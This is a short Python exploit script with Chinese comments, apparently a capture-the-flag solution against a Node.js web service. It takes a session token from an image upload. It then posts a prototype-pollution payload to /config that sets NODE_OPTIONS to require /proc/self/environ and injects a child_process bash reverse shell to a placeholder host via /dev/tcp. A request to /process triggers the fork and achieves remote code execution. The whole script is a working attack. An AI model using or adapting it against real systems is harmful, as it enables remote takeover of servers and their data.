import requests
import re


url = "http://ip:port/"

# 获取token
# 随便发送点图片获取token
files = [
    ('images', ('anno.png', open('./1.png', 'rb'), 'image/png')),
    ('images', ('soyo.png', open('./2.png', 'rb'), 'image/png'))
]
res = requests.post(url + "/upload", files=files)
token = res.headers.get('Set-Cookie')
match = re.search(r'token=([a-f0-9\-\.]+)', token)
if match:
    token = match.group(1)
    print(f"[+] token: {token}")

# 通过原型链污染env
# 反弹shell恶意代码注入
headers = {
    'Cookie': f'token={token}'
}

payload = {
    "constructor": {
        "prototype": {
            "NODE_OPTIONS": "--require /proc/self/environ",
            "env": {
                 "A":"require(\"child_process\").execSync(\"bash -c \'bash -i >& /dev/tcp/ip/port 0>&1\'\")//"
            }
        }
    }
}

# 原型链污染
requests.post(url + "/config", json=payload, headers=headers)

# 触发fork实现RCE
requests.post(url + "/process", headers=headers)
